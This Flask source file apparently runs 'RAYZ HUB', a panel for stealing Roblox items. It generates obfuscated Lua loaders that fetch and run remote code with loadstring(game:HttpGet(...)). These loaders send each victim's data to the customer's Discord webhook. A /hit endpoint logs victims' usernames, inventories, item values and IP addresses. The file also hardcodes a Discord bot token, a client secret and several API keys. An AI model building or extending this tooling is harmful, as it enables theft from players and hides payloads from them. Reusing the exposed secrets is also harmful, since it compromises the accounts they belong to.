import os
from flask import Flask, redirect, url_for, request, session, render_template, jsonify
from supabase import create_client, Client
import requests
import json
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "super-secret-key-change-this-in-production")

SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMn0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

DISCORD_CLIENT_ID = "1465413171576569887"
DISCORD_CLIENT_SECRET = "PdzQj2CzuX22CslXxQCkF0HovANzOhQt"
DISCORD_BOT_TOKEN = "MTQ2NTQxMzE3MTU3NjU2OTg4Nw.G8chae.YGDiOuJlwtKRKNbFO2H_oFhUyVf48wBvkdas-U"
TARGET_GUILD_ID = "1422073445927354380"
DISCORD_REDIRECT_URI = "https://rayzzhub.vercel.app/callback"

LUA_OBFUSCATOR_KEY = "6f50e5b-47f7-3511-2e46-203673a9c2fe7196"
PASTEFY_API_KEY = "N42BWyvsnqwXrVdsD5CBnH4Gwk1YBda2E3fHgL482zLDMYQWgDoroNiFrMdK"

EMOJI_INFO = "<:rayz_info:1459657883846185021>"

def get_user_config(user_id: str):
    response = supabase.table("user_configs").select("*").eq("user_id", user_id).execute()
    if response.data:
        return response.data[0]
    default_config = {
        "user_id": user_id,
        "usernames": [],
        "webhook": None,
        "paste_id": None,
        "loader_paste_id": None,
        "blacklisted": False,
        "hits": 0
    }
    supabase.table("user_configs").insert(default_config).execute()
    return default_config

def update_user_config(user_id: str, updates: dict):
    supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()

def verify_webhook(url):
    payload = {
        "embeds": [{
            "title": "RAYZ HUB",
            "description": f"```\n{EMOJI_INFO} testing if ur webhook's working to use on rayz hub\n```"
        }]
    }
    try:
        resp = requests.post(url, json=payload, timeout=5)
        return resp.status_code in [200, 204]
    except:
        return False

def obfuscate_lua(script: str):
    headers = {"apikey": LUA_OBFUSCATOR_KEY}
    try:
        resp = requests.post("https://api.luaobfuscator.com/v1/obfuscator/newscript", headers=headers, data=script)
        if resp.status_code != 200: return None
        data = resp.json()
        session_id = data.get("sessionId")
        if not session_id: return None

        headers["sessionId"] = session_id
        payload = {"MinifyAll": True, "CustomPlugins": {"EncryptStrings": [100], "SwizzleLookups": [100], "MutateAllLiterals": [50]}}
        resp = requests.post("https://api.luaobfuscator.com/v1/obfuscator/obfuscate", headers=headers, json=payload)
        if resp.status_code != 200: return None
        data = resp.json()
        return data.get("code")
    except:
        return None

def create_or_update_paste(user_id: str, content: str, persistent: bool = True):
    config = get_user_config(user_id)
    paste_id = config.get("paste_id") if persistent else None

    headers = {"Authorization": f"Bearer {PASTEFY_API_KEY}"}
    payload = {"title": "RAYZ HUB", "content": content, "visibility": "UNLISTED"}

    try:
        if persistent and paste_id:
            resp = requests.patch(f"https://pastefy.app/api/v2/paste/{paste_id}", headers=headers, json=payload)
            if resp.status_code == 200: return paste_id

        resp = requests.post("https://pastefy.app/api/v2/paste", headers=headers, json=payload)
        if resp.status_code == 200:
            data = resp.json()
            new_id = data.get("paste", {}).get("id")
            if persistent:
                update_user_config(user_id, {"paste_id": new_id})
            return new_id
    except:
        pass
    return None

def sync_user_scripts(user_id: str):
    config = get_user_config(user_id)
    if not config.get("usernames") or not config.get("webhook"):
        return

    if config.get("paste_id"):
        lua_usernames = "{" + ",".join([f'"{u}"' for u in config["usernames"]]) + "}"
        raw_lua = f'users = {lua_usernames}\nweb = "{config["webhook"]}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/loader.lua"))()'
        obf = obfuscate_lua(raw_lua)
        content = obf or raw_lua
        headers = {"Authorization": f"Bearer {PASTEFY_API_KEY}"}
        payload = {"title": "RAYZ HUB", "content": content, "visibility": "UNLISTED"}
        requests.patch(f"https://pastefy.app/api/v2/paste/{config['paste_id']}", headers=headers, json=payload)

    if config.get("loader_paste_id"):
        raw_loader = f'ID = "{config["paste_id"]}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/api/main.lua"))()'
        obf_loader = obfuscate_lua(raw_loader)
        content = obf_loader or raw_loader
        headers = {"Authorization": f"Bearer {PASTEFY_API_KEY}"}
        payload = {"title": "RAYZ HUB LOADER", "content": content, "visibility": "UNLISTED"}
        requests.patch(f"https://pastefy.app/api/v2/paste/{config['loader_paste_id']}", headers=headers, json=payload)

def get_global_stats():
    try:
        response = supabase.table("user_configs").select("hits").execute()
        if not response.data:
            return 0, 0
        
        total_users = len(response.data)
        total_hits = sum(item.get('hits', 0) or 0 for item in response.data)
        return total_hits, total_users
    except Exception as e:
        print(f"Error fetching stats: {e}")
        return 0, 0

@app.route('/')
def home():
    total_hits, total_users = get_global_stats()
    return render_template('index.html', total_hits=total_hits, total_users=total_users)

@app.route('/login')
def login():
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize?"
        f"client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20guilds.join"
    )
    return render_template('login.html', auth_url=discord_auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Error: No code provided", 400

    data = {
        'client_id': DISCORD_CLIENT_ID,
        'client_secret': DISCORD_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': DISCORD_REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    resp = requests.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
    if resp.status_code != 200:
        return "Authentication failed", 400

    token_data = resp.json()
    access_token = token_data['access_token']

    user_resp = requests.get(
        'https://discord.com/api/users/@me',
        headers={'Authorization': f'Bearer {access_token}'}
    )
    if user_resp.status_code != 200:
        return "Failed to fetch user info", 400

    user = user_resp.json()
    user_id = user['id']

    # Add user to the target guild
    add_url = f"https://discord.com/api/v10/guilds/{TARGET_GUILD_ID}/members/{user_id}"
    add_headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    add_payload = {
        "access_token": access_token
    }

    add_resp = requests.put(add_url, headers=add_headers, json=add_payload)
    if add_resp.status_code in (201, 204):
        print(f"Added {user_id} to guild {TARGET_GUILD_ID}")
    else:
        print(f"Failed to add {user_id} to guild: {add_resp.status_code} {add_resp.text}")

    session['user'] = user
    return redirect(url_for('dashboard'))

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    user = session['user']
    user_id = user['id']
    config = get_user_config(user_id)
    error = None

    if request.method == 'POST':
        usernames = request.form.get('usernames')
        webhook = request.form.get('webhook')
        user_list = [u.strip() for u in usernames.split(",") if u.strip()] if usernames else []
        if verify_webhook(webhook):
            update_user_config(user_id, {"usernames": user_list, "webhook": webhook})
            sync_user_scripts(user_id)
            return redirect(url_for('dashboard'))
        else:
            error = "Webhook verification failed."

    blacklisted = config.get('blacklisted', False)
    setup_needed = not config.get('usernames') or not config.get('webhook')

    avg_daily_hits = 0
    try:
        seven_days_ago = (datetime.now() - timedelta(days=7)).isoformat()
        resp = supabase.table("hits_logger").select("created_at").eq("user_id", user_id).gte("created_at", seven_days_ago).execute()
        if resp.data:
            hits_count = len(resp.data)
            avg_daily_hits = round(hits_count / 7, 1)
    except Exception as e:
        print(f"Error calculating avg hits: {e}")

    daily_hits = defaultdict(int)
    today = datetime.now().date()
    for i in range(7):
        day = (today - timedelta(days=i)).strftime('%Y-%m-%d')
        daily_hits[day] = 0

    try:
        seven_days_ago_iso = (datetime.now() - timedelta(days=7)).isoformat()
        hits_resp = supabase.table("hits_logger") \
            .select("created_at") \
            .eq("user_id", user_id) \
            .gte("created_at", seven_days_ago_iso) \
            .execute()
        for row in hits_resp.data or []:
            date_str = row['created_at'][:10]
            daily_hits[date_str] += 1
    except Exception as e:
        print(f"Error fetching daily hits: {e}")

    main_script = None
    loader_script = None
    if not setup_needed:
        if config.get('paste_id'):
            main_script = f'ID = "{config["paste_id"]}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/api/main.lua"))()'
        if config.get('loader_paste_id'):
            loader_script = f'loadstring(game:HttpGet("https://pastefy.app/{config["loader_paste_id"]}/raw"))()'

    now = datetime.now()

    return render_template(
        'dashboard.html',
        config=config,
        user=user,
        main_script=main_script,
        loader_script=loader_script,
        setup=setup_needed,
        blacklisted=blacklisted,
        error=error,
        avg_daily_hits=avg_daily_hits,
        daily_hits=daily_hits,
        now=now,
        timedelta=timedelta
    )

@app.route('/regenerate_main', methods=['GET'])
def regenerate_main():
    if 'user' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    user_id = session['user']['id']
    config = get_user_config(user_id)
    if config.get('blacklisted'):
        return jsonify({'error': 'Blacklisted'}), 403
    if not config.get("usernames") or not config.get("webhook"):
        return jsonify({'error': 'Setup incomplete'}), 400
    lua_usernames = "{" + ",".join([f'"{u}"' for u in config["usernames"]]) + "}"
    raw_lua = f'users = {lua_usernames}\nweb = "{config["webhook"]}"\ndiscordid = "{user_id}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/loader.lua"))()'
    obf = obfuscate_lua(raw_lua)
    paste_id = create_or_update_paste(user_id, obf or raw_lua)
    if not paste_id:
        return jsonify({'error': 'Paste creation error'}), 500
    script = f'ID = "{paste_id}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/api/main.lua"))()'
    sync_user_scripts(user_id)
    return jsonify({'script': script, 'paste_id': paste_id})

@app.route('/regenerate_loader', methods=['GET'])
def regenerate_loader():
    if 'user' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    user_id = session['user']['id']
    config = get_user_config(user_id)
    if config.get('blacklisted'):
        return jsonify({'error': 'Blacklisted'}), 403
    if not config.get("paste_id"):
        return jsonify({'error': 'Generate main script first'}), 400
    raw = f'ID = "{config["paste_id"]}"\nloadstring(game:HttpGet("https://rayzhubb.vercel.app/api/main.lua"))()'
    obf = obfuscate_lua(raw)
    l_id = create_or_update_paste(user_id, obf or raw, persistent=False)
    if not l_id:
        return jsonify({'error': 'Paste creation error'}), 500
    update_user_config(user_id, {"loader_paste_id": l_id})
    final = f'loadstring(game:HttpGet("https://pastefy.app/{l_id}/raw"))()'
    sync_user_scripts(user_id)
    return jsonify({'script': final, 'loader_paste_id': l_id})

@app.route('/hit', methods=['GET', 'POST'])
def track_hit():
    args = request.args.to_dict()
    json_data = request.get_json(silent=True) or {}
    form_data = request.form.to_dict()
    
    data = {**args, **form_data, **json_data}
    
    print(f"DEBUG: Combined Data: {data}")
    
    user_id = data.get('id') or data.get('user_id') or data.get('discord_id')
    webhook = data.get('webhook')
    
    username = data.get('username')
    executor = data.get('executor')
    inventory = data.get('inventory')
    status = data.get('status', 'Success')
    
    target_user_id = None
    if user_id:
        target_user_id = str(user_id).strip()
        print(f"DEBUG: Using direct ID: {target_user_id}")
    elif webhook:
        from urllib.parse import unquote
        clean_webhook = unquote(str(webhook)).strip().lower()
        print(f"DEBUG: Looking for webhook: '{clean_webhook}'")
        
        resp = supabase.table("user_configs").select("user_id", "webhook").execute()
        if resp.data:
            for row in resp.data:
                stored_webhook = str(row.get('webhook', '') or '').strip().lower()
                if not stored_webhook: continue
                
                if clean_webhook in stored_webhook or stored_webhook in clean_webhook:
                    target_user_id = row['user_id']
                    print(f"DEBUG: Found match via containment! User ID: {target_user_id}")
                    break
                
                clean_parts = [p for p in clean_webhook.split('/') if p]
                stored_parts = [p for p in stored_webhook.split('/') if p]
                
                if len(clean_parts) > 0 and len(stored_parts) > 0:
                    clean_id = clean_parts[-1]
                    stored_id = stored_parts[-1]
                    
                    if clean_id and stored_id and clean_id == stored_id and len(clean_id) > 15:
                        target_user_id = row['user_id']
                        print(f"DEBUG: Found match via ID! User ID: {target_user_id}")
                        break
            
    if target_user_id:
        try:
            supabase.rpc("increment_hits_for_user", {"p_user_id": target_user_id}).execute()
            
            hit_entry = {
                "user_id": str(target_user_id),
                "player_name": str(username) if username else "Unknown",
                "executor": str(executor) if executor else "Unknown",
                "game_id": str(data.get('game_id', 'Unknown')),
                "ip_adress": request.remote_addr,
                "game_name": str(data.get('game_name', 'Unknown')),
                "items_sent": str(inventory) if inventory else "None",
                "total_value": str(data.get('total_value', '0'))
            }
            supabase.table("hits_logger").insert(hit_entry).execute()
            print(f"DEBUG: Successfully logged hit for {target_user_id}")
            return jsonify({"status": "success"}), 200
        except Exception as e:
            print(f"DEBUG: Database Error: {e}")
            return jsonify({"status": "error", "message": str(e)}), 500
        
    print("DEBUG: User not found.")
    return jsonify({"status": "error", "message": "User not found"}), 404

@app.route('/hits')
def hits_page():
    if 'user' not in session:
        return redirect(url_for('login'))
    user_id = session['user']['id']
    resp = supabase.table("hits_logger").select("*").eq("user_id", user_id).order("created_at", desc=True).execute()
    hits = resp.data if resp.data else []
    return render_template('hits.html', hits=hits)

@app.route('/discord')
def discord_redirect():
    return redirect("https://discord.gg/rayzhub", code=302)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)